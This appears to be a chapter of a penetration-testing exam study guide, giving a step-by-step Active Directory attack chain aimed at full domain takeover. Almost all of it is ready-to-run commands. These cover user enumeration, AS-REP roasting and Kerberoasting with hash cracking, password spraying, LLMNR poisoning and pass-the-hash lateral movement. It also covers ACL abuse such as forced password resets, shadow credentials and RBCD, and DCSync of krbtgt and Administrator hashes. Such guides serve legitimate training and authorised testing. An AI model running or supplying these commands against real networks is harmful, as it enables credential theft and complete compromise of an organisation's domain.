# 08 · Active Directory — initial access → domain dominance

AD is a chain, not a single box: land one credential, enumerate the graph, abuse a relationship to a
stronger identity, repeat until you own the domain. Think in **identities and edges**, not hosts.

> 🚩 **EXAM:** the AD set is scored as a connected chain. Kerberos tooling (impacket, Rubeus,
> BloodHound, netexec, mimikatz) is allowed — only Metasploit carries the one-machine limit.

> 💡 **Kerberos needs clock sync.** If you get `KRB_AP_ERR_SKEW`, `sudo ntpdate <dc-ip>` (or
> `faketime`). Add the DC + domain FQDN to `/etc/hosts` first — Kerberos hates bare IPs.

---

## 8.1 Enumerate before you have creds

```bash
netexec smb <dc-ip> -u '' -p '' --shares            # null session
netexec smb <dc-ip> -u guest -p '' --rid-brute      # enumerate users via RID cycling
enum4linux-ng -A <dc-ip>
rpcclient -U "" -N <dc-ip>   # > enumdomusers / querydispinfo (descriptions = planted passwords)
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=local" | grep -i sAMAccountName
kerbrute userenum -d domain.local --dc <dc-ip> users.txt   # valid users, no lockout risk
```
Build `users.txt` from these — it feeds everything below.

## 8.2 Get the first credential

- **AS-REP roast** (no creds needed — just usernames): grabs hashes for users with pre-auth disabled.
  ```bash
  impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash
  hashcat -m 18200 asrep.hash rockyou.txt
  ```
- **Password spray** one weak password across `users.txt` (mind lockout — check `--pass-pol` first):
  ```bash
  netexec smb <dc-ip> -u users.txt -p 'Season2025!' --continue-on-success
  ```
- **LLMNR/NBT-NS poisoning** (same subnet): `sudo responder -I <iface>` → capture NetNTLMv2 → crack `-m 5600`.
- **Loot** readable SMB shares, `querydispinfo` descriptions, and web configs for creds.

## 8.3 Enumerate with a credential (build the map)

```bash
netexec smb <dc-ip> -u user -p 'pass' --users --groups --pass-pol --shares
netexec ldap <dc-ip> -u user -p 'pass' --asreproast asrep.hash --kerberoasting kerb.hash
# Collect the graph
bloodhound-python -u user -p 'pass' -d domain.local -ns <dc-ip> -c All
```
Load into BloodHound, **mark owned nodes**, and run the paths that matter:
```cypher
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p
MATCH (u:User {hasspn:true}) RETURN u                 // Kerberoastable
MATCH (u:User {dontreqpreauth:true}) RETURN u          // AS-REP roastable
MATCH (u:User) WHERE toUpper(u.description) CONTAINS 'PASS' RETURN u.name,u.description
MATCH (n)-[:GetChanges]->(d:Domain),(n)-[:GetChangesAll]->(d) RETURN n   // DCSync rights
```

## 8.4 Credential attacks

```bash
# Kerberoast (any authenticated user) → crackable service-account hashes
impacket-GetUserSPNs domain.local/user:'pass' -dc-ip <dc-ip> -request -outputfile kerb.hash
hashcat -m 13100 kerb.hash rockyou.txt
```
Service accounts are the classic weak link — they're often in privileged groups.

## 8.5 Lateral movement (spend a credential/hash)

```bash
evil-winrm -i <ip> -u user -p 'pass'                       # WinRM 5985
netexec smb <subnet> -u user -H <NThash> --local-auth      # spray a hash, find where it's admin (Pwn3d!)
impacket-psexec  domain.local/user:'pass'@<ip>             # SYSTEM (noisy)
impacket-wmiexec domain.local/user@<ip> -hashes :<NThash>  # pass-the-hash, quieter
impacket-psexec  domain.local/user@<ip> -hashes :<NThash>  # PtH
```
> 💡 A single local-admin hash reused across the fleet (shared local admin) often unlocks half the domain.

## 8.6 ACL abuse (turn a graph edge into a stronger identity)

BloodHound shows you own an edge like **GenericWrite/GenericAll/WriteDACL/ForceChangePassword**. Pick by target type:

**Edge → Group** (add yourself):
```bash
# from Kali (creds only)
bloodyAD -d domain.local -u you -p 'pass' --host <dc-ip> add groupMember "Target Group" you
# from Windows
Add-DomainGroupMember -Identity "Target Group" -Members you    # PowerView
```

**Edge → User** — pick one:
```bash
# (a) Targeted Kerberoast: set a fake SPN, roast, crack, then REMOVE the SPN
bloodyAD ... set object target servicePrincipalName -v 'fake/spn'
impacket-GetUserSPNs domain.local/you:'pass' -request-user target -outputfile k.hash   # hashcat -m 13100
# (b) Force-change their password
bloodyAD ... set password target 'NewPass123!'      # or  net rpc password
# (c) Shadow credentials (2016+ / AD CS): add a key, auth as them, dump their hash
pywhisker -d domain.local -u you -p 'pass' --target target --action add --dc-ip <dc-ip>
# (d) AS-REP: disable their pre-auth, then roast
bloodyAD ... add uac target -f DONT_REQ_PREAUTH ; impacket-GetNPUsers ... -request-user target
```

**Edge → Computer** — RBCD:
```bash
impacket-addcomputer domain.local/you:'pass' -computer-name 'PWN$' -computer-pass 'Pass123!' -dc-ip <dc-ip>
impacket-rbcd domain.local/you:'pass' -delegate-from 'PWN$' -delegate-to 'TARGET$' -action write -dc-ip <dc-ip>
impacket-getST domain.local/'PWN$':'Pass123!' -spn cifs/target.domain.local -impersonate Administrator -dc-ip <dc-ip>
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass target.domain.local
```
> 💡 **Always clean up** what you set (SPN, UAC flag, shadow cred, scriptPath) — leftover changes break
> the environment and, in a real engagement, are noisy IOCs.

## 8.7 Domain dominance

Once you reach an account with replication rights (Domain Admin, or DCSync via an ACL):
```bash
# DCSync — pull any hash without touching the DC's disk
impacket-secretsdump domain.local/dauser:'pass'@<dc-ip>
impacket-secretsdump domain.local/you@<dc-ip> -hashes :<NThash> -just-dc-user krbtgt
# then pass-the-hash as Administrator, or forge a golden ticket from the krbtgt hash
impacket-psexec domain.local/Administrator@<dc-ip> -hashes :<AdminNThash>
```
Grab the Administrator NT hash and the `krbtgt` hash — that's the domain.

## 8.8 Before you're done

- [ ] Unauth enum done (null session, RID brute, AS-REP roast on the user list).
- [ ] First cred used to run BloodHound; owned nodes marked; paths to DA reviewed.
- [ ] Kerberoast + AS-REP roast run and cracked.
- [ ] Every hash/cred sprayed across the domain for lateral reuse.
- [ ] Any ACL edge to DA abused (and the change reverted).
- [ ] DCSync'd the Administrator + krbtgt hashes; proof + all three flags captured.
